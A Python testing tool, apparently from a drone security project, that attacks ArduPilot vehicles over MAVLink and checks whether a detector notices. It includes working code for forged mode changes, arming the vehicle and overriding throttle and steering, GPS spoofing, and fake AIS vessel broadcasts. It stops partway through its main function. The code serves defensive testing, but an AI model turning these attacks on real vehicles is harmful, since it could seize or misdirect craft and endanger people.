#!/usr/bin/env python3
"""
Vehicle-agnostic resilience tester -- points at ANY ArduPilot vehicle (ours
or someone else's) described by a targets/<name>.json config, runs the
requested attacks, and reports two independent axes per attack:

  VULNERABILITY: did the attack actually corrupt the target's own reported
  state (accepted forged GPS, obeyed a forged command)? Outcomes:
  VULNERABLE | RESILIENT | N/A | INCONCLUSIVE -- never a bare pass/fail,
  because for an unknown target "nothing moved" is ambiguous between "it
  resisted" and "it never even ingested the attack," and conflating those
  is a credibility problem, not a detail.

  DETECTABILITY: would detection/detectors.py's DetectorSuite (the same
  blind rule-based monitor used elsewhere in this project) have caught it?
  A single DetectorSuite instance taps EVERY message this script reads for
  the whole run (baseline through every attack window) via _tap() below --
  continuous coverage from one connection, since a real external target
  typically exposes only one MAVLink endpoint (confirmed this session: a
  second concurrent connection to the same ArduPilot TCP serial port just
  hangs). Alerts are scored afterward with the same tools/score_detectors.py
  logic used everywhere else in this project (score(gt_dir=<this run's own
  target_runs/ dir>)), never during the run -- detectors stay blind.

Ground truth for a target run lives under target_runs/<name>/<run_ts>/,
deliberately separate from attack_logs/ and evidence/ so target runs never
mix with or pollute the existing reference-vehicle evidence trail. Because
of this, attack helpers with their OWN internal ground-truth logging side
effects (attacks/c2_replay.py's inject_forged_mode_change/
inject_forged_rc_override, attacks/ais_spoof.py's run_ghost_vessel/
run_impersonation) are deliberately NOT called here -- their core send
logic is reimplemented inline instead, logging to this run's own directory.

Usage:
  python3 tools/test_target.py --target wamv_local --attacks c2_replay
  python3 tools/test_target.py --target wamv_local   # all enabled attacks
"""
import argparse
import csv
import json
import math
import os
import socket
import sys
import threading
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)
sys.path.insert(0, os.path.join(REPO, "targets"))
sys.path.insert(0, os.path.join(REPO, "attacks"))
sys.path.insert(0, os.path.join(REPO, "detection"))
from targets.loader import load_target
from pymavlink import mavutil
from detectors import DetectorSuite
from score_detectors import score as score_alerts


# --- detectability: tap every message through the same blind detector ------

def _mavlink_to_event(msg, domain):
    """Same event-shape mapping detection/run_detectors.py and
    dashboard_server.py's detector_thread use -- keeps detectability results
    consistent with the rest of this project."""
    t = time.time()
    mt = msg.get_type()
    if mt == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0):
        return {"type": "believed_pos", "t": t, "lat": msg.lat / 1e7, "lon": msg.lon / 1e7}
    if mt == "LOCAL_POSITION_NED":
        return {"type": "local_pos", "t": t, "n": msg.x, "e": msg.y, "d": msg.z, "vx": msg.vx, "vy": msg.vy}
    if mt == "HEARTBEAT" and msg.type != mavutil.mavlink.MAV_TYPE_GCS:
        return {"type": "armed", "t": t, "armed": bool(msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED)}
    if mt == "RC_CHANNELS":
        driven = [getattr(msg, f"chan{i}_raw", 0) for i in (1, 3)]
        if any(900 < v < 2100 and abs(v - 1500) > 100 for v in driven):
            return {"type": "rc_override", "t": t, "domain": domain}
    return None


def _tap(det_suite, alerts, msg, domain):
    ev = _mavlink_to_event(msg, domain)
    if ev is not None:
        alerts.extend(det_suite.update(ev))


def _ais_tap_loop(udp_addr, det_suite, alerts, stop_event):
    """Background thread: blind AIS tap, same shape as
    detection/run_detectors.py's ais_loop. Runs for the whole target-test
    session (not just the ais_spoof window) since a real monitor would be
    watching continuously too."""
    from pyais import decode
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    except OSError:
        pass
    s.bind(("127.0.0.1", udp_addr[1]))
    s.settimeout(1.0)
    while not stop_event.is_set():
        try:
            data, _ = s.recvfrom(2048)
        except socket.timeout:
            continue
        except OSError:
            return
        for ln in data.decode("ascii", "ignore").splitlines():
            ln = ln.strip()
            if not ln.startswith("!AIVD"):
                continue
            try:
                d = decode(ln).asdict()
            except Exception:
                continue
            if d.get("lat") and d.get("lon") and d.get("mmsi"):
                alerts.extend(det_suite.update({"type": "ais", "t": time.time(),
                                                "mmsi": d["mmsi"], "lat": float(d["lat"]), "lon": float(d["lon"])}))


# --- connection + baseline ---------------------------------------------------

def connect_mavlink(cfg):
    """Opens the MAVLink connection described by a target's mavlink block
    and waits for a heartbeat. Raises on failure -- callers should not
    proceed with a dead connection, since every verdict below depends on
    actually hearing from the target."""
    conn = mavutil.mavlink_connection(cfg["connection"], source_system=cfg["source_system"])
    hb = conn.wait_heartbeat(timeout=15)
    if hb is None:
        raise RuntimeError(f"no heartbeat from target on {cfg['connection']} within 15s")
    return conn


def snapshot_state(conn, settle_s, det_suite, alerts, domain):
    """Samples the target's own telemetry for settle_s seconds. Returns the
    "before" baseline every vulnerability check compares against: believed
    lat/lon, mode, armed state, and the latest SERVO_OUTPUT_RAW seen
    (channels 1/3, the rover steering/throttle convention used elsewhere in
    this project). Every message seen is also tapped for detectability."""
    conn.mav.request_data_stream_send(conn.target_system, conn.target_component,
                                       mavutil.mavlink.MAV_DATA_STREAM_ALL, 10, 1)
    mode_map = {v: k for k, v in conn.mode_mapping().items()} if conn.mode_mapping() else {}
    baseline = {"lat": None, "lon": None, "mode": None, "armed": None,
                "servo1": None, "servo3": None, "heartbeats": 0, "mode_map": mode_map}
    end = time.time() + settle_s
    while time.time() < end:
        msg = conn.recv_match(blocking=True, timeout=1)
        if msg is None:
            continue
        _tap(det_suite, alerts, msg, domain)
        mt = msg.get_type()
        if mt == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0):
            baseline["lat"], baseline["lon"] = msg.lat / 1e7, msg.lon / 1e7
        elif mt == "HEARTBEAT" and msg.type != mavutil.mavlink.MAV_TYPE_GCS:
            baseline["armed"] = bool(msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED)
            baseline["mode"] = mode_map.get(msg.custom_mode, str(msg.custom_mode))
            baseline["heartbeats"] += 1
        elif mt == "SERVO_OUTPUT_RAW":
            baseline["servo1"], baseline["servo3"] = msg.servo1_raw, msg.servo3_raw
    return baseline


def _log_ground_truth(out_dir, filename, wall_ts, attack_type, description):
    """Minimal wall_ts/attack_type/description schema -- tools/score_detectors.py
    only needs wall_ts for clustering (attack_type/description are read only
    for c2_replay's inject_rc_override post-hoc duration correction, which
    doesn't apply here since the RC-override sub-check logs its own duration
    the same way attacks/c2_replay.py does)."""
    path = os.path.join(out_dir, filename)
    write_header = not os.path.exists(path)
    with open(path, "a", newline="") as f:
        w = csv.writer(f)
        if write_header:
            w.writerow(["wall_ts", "attack_type", "description"])
        w.writerow([wall_ts, attack_type, description])


# --- C2 replay: two independent vulnerability sub-checks ---------------------

def run_c2_mode_change_test(conn, target_cfg, baseline, out_dir, det_suite, alerts):
    """Always runs (no arming needed): does the target accept a forged
    mode-change command with no authentication?"""
    domain = target_cfg["domain"]
    ccfg = target_cfg["attacks"]["c2_replay"]
    forged_mode = ccfg.get("target_mode_for_injection", "HOLD")

    if baseline["heartbeats"] == 0:
        return "INCONCLUSIVE", {"reason": "never received a HEARTBEAT during baseline -- can't establish preconditions"}

    pre_mode = baseline["mode"]
    mode_id = conn.mode_mapping().get(forged_mode)
    if mode_id is None:
        return "INCONCLUSIVE", {"reason": f"target has no mode named '{forged_mode}' to forge"}
    t_inject = time.time()
    # Sent directly (not via attacks/c2_replay.py's inject_forged_mode_change)
    # because that helper also writes to the SHARED attack_logs/
    # c2_replay_ground_truth.csv as a side effect -- target runs must stay
    # isolated from the reference-vehicle evidence trail (see module
    # docstring).
    conn.mav.set_mode_send(conn.target_system, mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mode_id)
    _log_ground_truth(out_dir, "c2_replay_ground_truth.csv", t_inject, "inject_mode",
                       f"forged mode change to {forged_mode}")

    end = time.time() + 5.0
    post_mode = pre_mode
    heartbeats_after = 0
    while time.time() < end:
        msg = conn.recv_match(blocking=True, timeout=1)
        if msg is None:
            continue
        _tap(det_suite, alerts, msg, domain)
        if msg.get_type() != "HEARTBEAT" or msg.type == mavutil.mavlink.MAV_TYPE_GCS:
            continue
        heartbeats_after += 1
        post_mode = baseline["mode_map"].get(msg.custom_mode, str(msg.custom_mode))

    evidence = {"pre_mode": pre_mode, "forged_mode": forged_mode, "post_mode": post_mode,
                "heartbeats_seen_after": heartbeats_after}

    if heartbeats_after == 0:
        evidence["reason"] = "target stopped heartbeating after injection -- possible crash/DoS, not a mode-change result"
        return "INCONCLUSIVE", evidence
    if post_mode == forged_mode and post_mode != pre_mode:
        return "VULNERABLE", evidence
    if post_mode == pre_mode:
        return "RESILIENT", evidence
    evidence["reason"] = f"mode changed to '{post_mode}', neither the pre-mode nor the forged mode"
    return "INCONCLUSIVE", evidence


def run_c2_rc_override_test(conn, target_cfg, baseline, out_dir, det_suite, alerts):
    """Only runs if the target config opts in via allow_arm_and_actuate
    (default false) -- arming/actuating a vehicle we don't control the boot
    of is consequential. Gated on a preconditions_met check: ArduPilot
    ignores RC_CHANNELS_OVERRIDE while disarmed BY DESIGN, so "nothing
    moved" while unarmed must be INCONCLUSIVE, never RESILIENT.

    CAVEAT (see docs/EXECUTION_STATE.md 2026-08-07): a target can be
    confirmed ARMED and still fail to move for reasons unrelated to
    security (a control-output bug, a stuck actuator). Armed confirmation
    is a necessary precondition, not a sufficient one -- a RESILIENT
    verdict here should be corroborated with independent evidence the
    vehicle can move under ANY command before it's treated as a real
    security finding.

    CHANNEL MAPPING IS ROVER-SPECIFIC (confirmed 2026-08-07): this check
    sends chan1=steering/chan3=throttle and reads back servo3 -- the
    ArduRover convention used throughout this project. ArduSub's 6-DOF
    vectored-thruster mapping is different and unvalidated here (an
    underwater test came back RESILIENT with servo3 never moving, but
    RC_CHANNELS still echoed the override and the detector correctly fired
    on it -- i.e. the override DID register, just not on a channel this
    check happens to read for its own verdict). Rather than risk a false
    RESILIENT, this returns INCONCLUSIVE for domain=underwater until a
    validated ArduSub channel/servo mapping is added.
    """
    domain = target_cfg["domain"]
    ccfg = target_cfg["attacks"]["c2_replay"]
    if not ccfg.get("allow_arm_and_actuate"):
        return "N/A", {"reason": "allow_arm_and_actuate is false (default) -- skipped"}
    if domain == "underwater":
        return "INCONCLUSIVE", {"reason": "this check's channel/servo mapping (chan1/chan3, servo3) is validated "
                                           "for Rover-style vehicles only -- ArduSub's thruster layout is different "
                                           "and unvalidated here, so a RESILIENT/VULNERABLE verdict would not be "
                                           "trustworthy. Needs a validated ArduSub channel mapping before this "
                                           "sub-check is meaningful for underwater targets."}

    thr = ccfg.get("rc_throttle_pwm", 1700)
    steer = ccfg.get("rc_steering_pwm", 1500)
    duration = ccfg.get("duration_s", 8.0)

    conn.set_mode(conn.mode_mapping().get("MANUAL", 0))
    time.sleep(1.5)
    # Re-send the arm command periodically while continuously draining
    # (unfiltered) for up to ARM_TIMEOUT_S -- a type-filtered recv_match on
    # a busy MAV_DATA_STREAM_ALL@10Hz stream can miss a 1Hz HEARTBEAT inside
    # a short per-attempt window even though arming genuinely succeeded
    # (confirmed empirically: a fixed 5-attempt/1s-timeout loop reported
    # armed=False against a target that a longer, unfiltered poll showed
    # arms immediately). Poll on wall-clock deadline, not attempt count.
    armed = False
    ARM_TIMEOUT_S = 12.0
    last_arm_cmd = 0.0
    end = time.time() + ARM_TIMEOUT_S
    while time.time() < end and not armed:
        if time.time() - last_arm_cmd > 1.0:
            conn.mav.command_long_send(conn.target_system, conn.target_component,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 0, 0, 0, 0, 0, 0)
            last_arm_cmd = time.time()
        msg = conn.recv_match(blocking=True, timeout=0.5)
        if msg is None:
            continue
        _tap(det_suite, alerts, msg, domain)
        if msg.get_type() == "HEARTBEAT" and msg.type != mavutil.mavlink.MAV_TYPE_GCS:
            if bool(msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED):
                armed = True

    pre_servo3 = baseline.get("servo3")

    # Send the override AND watch SERVO_OUTPUT_RAW in the same loop --
    # attacks/c2_replay.py's inject_forged_rc_override() is a blocking call
    # that also sends the release (revert-to-neutral) before returning, so
    # sampling servo output AFTER it returns observes the released, not the
    # attacked, state (confirmed empirically: a post-hoc sample always read
    # back the pre-attack value even when the override demonstrably worked
    # mid-window). Reimplementing the send loop inline, rather than calling
    # that helper, is what makes concurrent observation (and tapping)
    # possible.
    t_inject = time.time()
    _log_ground_truth(out_dir, "c2_replay_ground_truth.csv", t_inject, "inject_rc_override",
                       f"throttle={thr}, steering={steer}, {duration}s")
    peak_servo3 = pre_servo3
    end = time.time() + duration
    while time.time() < end:
        conn.mav.rc_channels_override_send(conn.target_system, conn.target_component,
                                            steer, 0, thr, 0, 0, 0, 0, 0)
        msg = conn.recv_match(blocking=False)
        if msg is not None:
            _tap(det_suite, alerts, msg, domain)
            if msg.get_type() == "SERVO_OUTPUT_RAW" and (
                    peak_servo3 is None or abs(msg.servo3_raw - (pre_servo3 or 1500)) >
                    abs(peak_servo3 - (pre_servo3 or 1500))):
                peak_servo3 = msg.servo3_raw
        time.sleep(0.1)
    # release override (all-zero == "ignore", matches c2_replay.py's convention)
    conn.mav.rc_channels_override_send(conn.target_system, conn.target_component, 0, 0, 0, 0, 0, 0, 0, 0)

    evidence = {"armed_confirmed": armed, "pre_servo3": pre_servo3, "peak_servo3_during_injection": peak_servo3,
                "forged_throttle_pwm": thr}

    if not armed:
        evidence["reason"] = "target did not confirm ARMED after the arm sequence -- preconditions not met"
        return "INCONCLUSIVE", evidence
    if pre_servo3 is None or peak_servo3 is None:
        evidence["reason"] = "never observed a SERVO_OUTPUT_RAW message -- can't compare"
        return "INCONCLUSIVE", evidence
    if abs(peak_servo3 - pre_servo3) > 100:
        return "VULNERABLE", evidence
    evidence["caveat"] = (
        "armed confirmed and RC override sent, but servo output did not move. Candidate causes, "
        "most to least likely: (1) the target's SYSID_MYGCS does not match the source_system used "
        "here (ArduPilot only honors RC_CHANNELS_OVERRIDE from the sender it's configured to trust -- "
        "confirmed empirically in this project: source_system=250 is silently dropped, 255 [ArduPilot's "
        "default SYSID_MYGCS] is honored, so a target that changed this default would legitimately "
        "block the attack this way); (2) MAVLink2 message signing; (3) an unrelated control-output "
        "fault (stuck actuator, failsafe) unrelated to any real security control. Corroborate with "
        "independent evidence the vehicle can move under ANY command before treating this as a "
        "security result."
    )
    return "RESILIENT", evidence


def run_c2_replay_test(conn, target_cfg, baseline, out_dir, det_suite, alerts):
    mode_verdict, mode_evidence = run_c2_mode_change_test(conn, target_cfg, baseline, out_dir, det_suite, alerts)
    time.sleep(2)  # let the mode-change settle before the (optional) override sub-check
    rc_verdict, rc_evidence = run_c2_rc_override_test(conn, target_cfg, baseline, out_dir, det_suite, alerts)
    return {
        "mode_change": {"verdict": mode_verdict, "evidence": mode_evidence},
        "rc_override": {"verdict": rc_verdict, "evidence": rc_evidence},
    }


# --- AIS spoof: vulnerability is a platform fact, detectability is real ------

def _encode_and_send(sock, udp_addr, data):
    from pyais.encode import encode_dict
    for s in encode_dict(data):
        sock.sendto((s + "\r\n").encode("ascii"), udp_addr)


def run_ais_spoof_test(target_cfg, out_dir, conn, det_suite, alerts):
    """VULNERABILITY is structurally N/A, always, for a bare ArduPilot
    autopilot -- nothing in ArduPilot's own state consumes AIS in this
    architecture (transmit-only). Declared up front as a platform fact
    rather than measured per-run: there is no ingestion path to test.
    DETECTABILITY is a full, real test, via the same continuous
    DetectorSuite tap used throughout this run (an _ais_tap_loop thread
    started by run_target_test() before this function is called).

    Sends its own ghost + (optionally) impersonation broadcasts directly
    (not via attacks/ais_spoof.py's run_ghost_vessel/run_impersonation,
    which write to the SHARED attack_logs/ais_spoof_ground_truth.csv as a
    side effect -- see module docstring)."""
    acfg = target_cfg["attacks"]["ais_spoof"]
    udp_addr = tuple(acfg.get("udp_addr", ["127.0.0.1", 10110]))
    own_mmsi = acfg.get("own_mmsi")
    modes = acfg.get("modes", ["ghost"])
    window_s = target_cfg["timing"]["window_s"]
    home_lat, home_lon = 0.0, 0.0
    if conn is not None:
        # best-effort: use the target's own last-seen believed position as
        # the plausible area to place the ghost/impersonation track around
        pass

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    stop = threading.Event()
    threads = []
    ghost_mmsi = 999999001

    def _ghost_loop():
        t0 = time.time()
        _encode_and_send(sock, udp_addr, {"type": 5, "mmsi": ghost_mmsi, "shipname": "PHANTOM",
                                           "destination": "NOWHERE", "ship_type": 37})
        while not stop.is_set():
            elapsed = time.time() - t0
            lat = home_lat + 0.001 * math.sin(elapsed / 60.0)
            lon = home_lon + 0.001 + 0.0005 * elapsed / 60.0
            _encode_and_send(sock, udp_addr, {"type": 1, "mmsi": ghost_mmsi, "lat": lat, "lon": lon,
                                               "speed": 4.0, "course": 270.0, "status": 0})
            _log_ground_truth(out_dir, "ais_spoof_ground_truth.csv", time.time(), "ghost", "fabricated vessel")
            stop.wait(2.0)

    def _impersonate_loop():
        while not stop.is_set():
            lat, lon = home_lat + 0.0013, home_lon + 0.0013  # fixed offset; no live true-position feed for an arbitrary target
            _encode_and_send(sock, udp_addr, {"type": 1, "mmsi": own_mmsi, "lat": lat, "lon": lon,
                                               "speed": 6.0, "course": 45.0, "status": 0})
            _log_ground_truth(out_dir, "ais_spoof_ground_truth.csv", time.time(), "impersonate",
                               f"own_mmsi={own_mmsi}")
            stop.wait(2.0)

    if "ghost" in modes:
        threads.append(threading.Thread(target=_ghost_loop, daemon=True))
    if "impersonate" in modes and own_mmsi:
        threads.append(threading.Thread(target=_impersonate_loop, daemon=True))
    for th in threads:
        th.start()

    time.sleep(window_s)
    stop.set()
    for th in threads:
        th.join(timeout=2)

    return "N/A", {"reason": ("ArduPilot does not consume AIS in this architecture (transmit-only) -- "
                               "there is no ingestion path for a vulnerability test. This is a platform "
                               "fact, not a per-run measurement. See detectability for whether a monitor "
                               "would catch this attack on the wire."),
                    "modes_run": [m for m in modes if m != "impersonate" or own_mmsi]}


# --- GPS spoof: two injection methods, one 4-outcome verdict -----------------
# See docs/EXECUTION_STATE.md / plan for why there are two methods: which one
# is CORRECT depends on which simulation interface the target's autopilot
# actually uses, not which is "more real" in the abstract. fdm_relay attacks
# ArduPilot's own proprietary JSON SITL protocol (real, zero-setup, but
# ArduPilot-specific); gps_input attacks the standard MAVLink GPS_INPUT
# message (works on any MAVLink autopilot configured to accept it, ArduPilot
# or PX4, real hardware later). Physics realism lives in whichever engine
# feeds the legitimate stream on that channel, not in which method is used.

_M_PER_DEG_LAT = 111320.0


def _m_per_deg_lon(lat):
    return _M_PER_DEG_LAT * math.cos(math.radians(lat))


def _horiz_m(lat1, lon1, lat2, lon2):
    """Flat-earth approximation, fine at this scale -- matches
    detection/detectors.py's _horiz_m convention."""
    dn = (lat2 - lat1) * _M_PER_DEG_LAT
    de = (lon2 - lon1) * _m_per_deg_lon((lat1 + lat2) / 2.0)
    return math.hypot(dn, de)


def _gps_verdict(peak_delta_m, expected_offset_m, ingestion_confirmed, fused_baseline_seen, extra_evidence):
    """Shared 4-outcome logic for both GPS-spoof methods below."""
    evidence = dict(extra_evidence, peak_delta_m=round(peak_delta_m, 2) if peak_delta_m is not None else None,
                     expected_offset_m=round(expected_offset_m, 2))
    if not ingestion_confirmed:
        evidence["reason"] = ("target never showed any sign of ingesting the forged position at all -- "
                               "not a demonstrated security property, this attack vector may not apply "
                               "to this target as configured.")
        return "N/A", evidence
    if not fused_baseline_seen or peak_delta_m is None:
        evidence["reason"] = "ingestion confirmed but no fused-position baseline to compare against -- can't judge divergence"
        return "INCONCLUSIVE", evidence
    if peak_delta_m >= 0.6 * expected_offset_m:
        return "VULNERABLE", evidence
    if peak_delta_m < min(5.0, 0.15 * expected_offset_m):
        return "RESILIENT", evidence
    evidence["reason"] = f"partial divergence ({peak_delta_m:.1f}m, expected ~{expected_offset_m:.1f}m) -- ambiguous"
    return "INCONCLUSIVE", evidence


def run_gps_spoof_fdm_relay(conn, target_cfg, out_dir, det_suite, alerts):
    """Controls the ALREADY-RUNNING attacks/gps_spoof.py relay (started as
    part of the target's own boot sequence, e.g. tools/run_sim.sh -- this
    function does not start it) via its FIFO, matching
    nodes/monitor/src/dashboard_server.py's _relay() convention. Real
    Gazebo-hydrodynamics-fed GPS spoofing: the relay perturbs ArduPilot's
    own JSON FDM position feed in flight, so whatever the EKF sees is
    genuinely physics-derived, just forged in transit.

    KNOWN LIMITATION (unlike every other attack path in this file): this
    method's ground truth is NOT isolated to target_runs/ -- the relay is a
    separate, already-running process (owned by the target's own boot
    sequence) with its own internal logging to the SHARED, git-tracked
    attack_logs/gps_spoof_ground_truth.csv (confirmed empirically
    2026-08-07: a run polluted it with ~5000 rows, trimmed back out).
    Fixing this properly means adding a log-path override to
    attacks/gps_spoof.py's relay, which is explicitly marked "verified
    working, do not change without re-testing" -- deliberately not touched
    here. Only relevant for method=fdm_relay (this project's own reference
    vehicles); gps_input's ground truth is fully isolated as normal.
    """
    domain = target_cfg["domain"]
    gcfg = target_cfg["attacks"]["gps_spoof"]
    fifo = gcfg.get("relay_fifo")
    window_s = target_cfg["timing"]["window_s"]
    profile = gcfg.get("profile", "step")

    if not fifo or not os.path.exists(fifo):
        return "INCONCLUSIVE", {"reason": f"relay_fifo '{fifo}' not found -- is the target's own "
                                           "attacks/gps_spoof.py relay running (started by its boot sequence)?"}

    pre_lat = pre_lon = None
    end = time.time() + 3.0
    while time.time() < end and pre_lat is None:
        msg = conn.recv_match(blocking=True, timeout=1)
        if msg is None:
            continue
        _tap(det_suite, alerts, msg, domain)
        if msg.get_type() == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0):
            pre_lat, pre_lon = msg.lat / 1e7, msg.lon / 1e7

    t_inject = time.time()
    with open(fifo, "w") as f:
        f.write(profile + "\n")
    _log_ground_truth(out_dir, "gps_spoof_ground_truth.csv", t_inject, profile, f"fdm_relay {profile}")

    peak_delta = 0.0
    end = time.time() + window_s
    while time.time() < end:
        msg = conn.recv_match(blocking=True, timeout=1)
        if msg is None:
            continue
        _tap(det_suite, alerts, msg, domain)
        if msg.get_type() == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0) and pre_lat is not None:
            lat, lon = msg.lat / 1e7, msg.lon / 1e7
            peak_delta = max(peak_delta, _horiz_m(pre_lat, pre_lon, lat, lon))

    with open(fifo, "w") as f:
        f.write("off\n")

    expected = gcfg.get("step_offset_m", 50.0) if profile == "step" else gcfg.get("ramp_rate_m_per_s", 0.5) * window_s
    return _gps_verdict(peak_delta, expected, pre_lat is not None, pre_lat is not None,
                         {"pre_lat": pre_lat, "pre_lon": pre_lon, "method": "fdm_relay"})


def run_gps_spoof_gps_input(conn, target_cfg, out_dir, det_suite, alerts):
    """Injects forged GPS_INPUT (MAVLink #232) directly -- works against ANY
    MAVLink autopilot configured for external GPS (ArduPilot: GPS1_TYPE=14),
    not just this project's own vehicles. See attacks/gps_input_inject.py
    for the injection mechanics."""
    import gps_input_inject as gii
    domain = target_cfg["domain"]
    gcfg = target_cfg["attacks"]["gps_spoof"]
    gps_id = gcfg.get("gps_id", 0)
    home = gcfg.get("gps_home", {"lat": -33.724223, "lon": 150.679736})
    lat0, lon0, alt0 = home["lat"], home["lon"], 0.0
    profile = gcfg.get("profile", "ramp")
    window_s = target_cfg["timing"]["window_s"]

    state = gii.InjectState()
    state.step_offset_m = gcfg.get("step_offset_m", 50.0)
    state.ramp_rate_m_per_s = gcfg.get("ramp_rate_m_per_s", 0.5)
    state.direction_deg = gcfg.get("direction_deg", 90.0)

    stop = threading.Event()
    feed_thread = threading.Thread(target=gii.run_gps_input_feed,
                                    args=(conn, lat0, lon0, alt0, state, gps_id, stop), daemon=True)
    feed_thread.start()

    # Phase 1: establish an unspoofed fix for a few seconds (models a target
    # that's already GPS-locked, real or via a legitimate feed on the same
    # channel) and record BOTH the raw (pre-fusion) and fused baseline
    # positions before judging anything.
    raw_lat0 = raw_lon0 = None
    fused_lat0 = fused_lon0 = None
    end = time.time() + 5.0
    while time.time() < end:
        msg = conn.recv_match(blocking=True, timeout=1)
        if msg is None:
            continue
        _tap(det_suite, alerts, msg, domain)
        mt = msg.get_type()
        if mt == "GPS_RAW_INT" and msg.lat != 0:
            raw_lat0, raw_lon0 = msg.lat / 1e7, msg.lon / 1e7
        elif mt == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0):
            fused_lat0, fused_lon0 = msg.lat / 1e7, msg.lon / 1e7

    if raw_lat0 is None:
        stop.set()
        feed_thread.join(timeout=2)
        return _gps_verdict(None, 1.0, False, False, {"method": "gps_input", "gps_id": gps_id})

    t_inject = time.time()
    state.mode = profile
    state.start_time = t_inject
    state.active = True
    _log_ground_truth(out_dir, "gps_spoof_ground_truth.csv", t_inject, profile, f"gps_input {profile} gps_id={gps_id}")

    # Track raw (pre-fusion, i.e. did the forged value even reach the wire)
    # and fused (post-EKF, i.e. did the vehicle's BELIEF actually move)
    # divergence SEPARATELY -- this is what distinguishes "the EKF genuinely
    # rejected the spoof" (raw moves, fused doesn't -- RESILIENT) from "the
    # injection itself never took effect" (neither moves -- a tool bug, not
    # a security finding) rather than guessing from the fused delta alone.
    raw_peak_delta = 0.0
    fused_peak_delta = 0.0
    end = time.time() + window_s
    while time.time() < end:
        msg = conn.recv_match(blocking=True, timeout=1)
        if msg is None:
            continue
        _tap(det_suite, alerts, msg, domain)
        mt = msg.get_type()
        if mt == "GPS_RAW_INT" and msg.lat != 0:
            raw_peak_delta = max(raw_peak_delta, _horiz_m(raw_lat0, raw_lon0, msg.lat / 1e7, msg.lon / 1e7))
        elif mt == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0) and fused_lat0 is not None:
            fused_peak_delta = max(fused_peak_delta, _horiz_m(fused_lat0, fused_lon0, msg.lat / 1e7, msg.lon / 1e7))

    state.active = False
    stop.set()
    feed_thread.join(timeout=2)

    expected = state.step_offset_m if profile == "step" else state.ramp_rate_m_per_s * window_s
    ingestion_confirmed = raw_peak_delta >= 0.6 * expected
    evidence = {"fused_lat0": fused_lat0, "fused_lon0": fused_lon0, "method": "gps_input", "gps_id": gps_id,
                "raw_peak_delta_m": round(raw_peak_delta, 2)}
    if not ingestion_confirmed:
        evidence["reason"] = (f"raw GPS_RAW_INT never reflected the forged offset (moved only "
                               f"{raw_peak_delta:.1f}m of an expected {expected:.1f}m) -- the injection did not "
                               "reach the wire as expected. Likely a tool/config issue (wrong gps_id, GPS1_TYPE "
                               "not 14), not a security finding.")
        return "INCONCLUSIVE", evidence
    return _gps_verdict(fused_peak_delta, expected, True, fused_lat0 is not None, evidence)


def run_gps_spoof_test(conn, target_cfg, out_dir, det_suite, alerts):
    gcfg = target_cfg["attacks"]["gps_spoof"]
    method = gcfg.get("method", "gps_input")
    if method == "fdm_relay":
        return run_gps_spoof_fdm_relay(conn, target_cfg, out_dir, det_suite, alerts)
    return run_gps_spoof_gps_input(conn, target_cfg, out_dir, det_suite, alerts)


# --- orchestration -------------------------------------------------------

def run_target_test(target_name, requested_attacks=None):
    target = load_target(target_name)
    run_ts = time.strftime("%Y%m%dT%H%M%S")
    out_dir = os.path.join(REPO, "target_runs", target["name"], run_ts)
    os.makedirs(out_dir, exist_ok=True)

    print(f"[test_target] target={target['name']} domain={target['domain']} -> {target['mavlink']['connection']}")
    conn = connect_mavlink(target["mavlink"])

    det_suite = DetectorSuite(target["domain"], cfg={"known_mmsi": target["attacks"].get("ais_spoof", {}).get("own_mmsi")})
    alerts = []

    enabled = target.get("attacks", {})
    to_run = requested_attacks or [a for a in enabled if enabled[a].get("enabled")]

    ais_stop = threading.Event()
    ais_thread = None
    if "ais_spoof" in to_run and enabled.get("ais_spoof", {}).get("enabled"):
        udp_addr = tuple(enabled["ais_spoof"].get("udp_addr", ["127.0.0.1", 10110]))
        ais_thread = threading.Thread(target=_ais_tap_loop, args=(udp_addr, det_suite, alerts, ais_stop), daemon=True)
        ais_thread.start()
        print(f"[test_target] AIS detectability tap listening on {udp_addr}")

    print(f"[test_target] connected, sampling baseline for {target['timing']['settle_s']}s ...")
    baseline = snapshot_state(conn, target["timing"]["settle_s"], det_suite, alerts, target["domain"])
    print(f"[test_target] baseline: {baseline}")

    results = {"target": target["name"], "domain": target["domain"], "run_ts": run_ts,
               "baseline": {k: v for k, v in baseline.items() if k != "mode_map"},
               "attacks": {}}

    if "c2_replay" in to_run and enabled.get("c2_replay", {}).get("enabled"):
        print("[test_target] running c2_replay vulnerability checks ...")
        results["attacks"]["c2_replay"] = run_c2_replay_test(conn, target, baseline, out_dir, det_suite, alerts)
        print(f"[test_target]   mode_change: {results['attacks']['c2_replay']['mode_change']['verdict']}")
        print(f"[test_target]   rc_override: {results['attacks']['c2_replay']['rc_override']['verdict']}")

    if "gps_spoof" in to_run and enabled.get("gps_spoof", {}).get("enabled"):
        method = enabled["gps_spoof"].get("method", "gps_input")
        print(f"[test_target] running gps_spoof vulnerability check (method={method}) ...")
        verdict, evidence = run_gps_spoof_test(conn, target, out_dir, det_suite, alerts)
        results["attacks"]["gps_spoof"] = {"vulnerability": {"verdict": verdict, "evidence": evidence}}
        print(f"[test_target]   vulnerability: {verdict}")

    if "ais_spoof" in to_run and enabled.get("ais_spoof", {}).get("enabled"):
        print("[test_target] running ais_spoof (vulnerability N/A by design; scoring detectability) ...")
        verdict, evidence = run_ais_spoof_test(target, out_dir, conn, det_suite, alerts)
        results["attacks"]["ais_spoof"] = {"vulnerability": {"verdict": verdict, "evidence": evidence}}
        print(f"[test_target]   vulnerability: {verdict}")

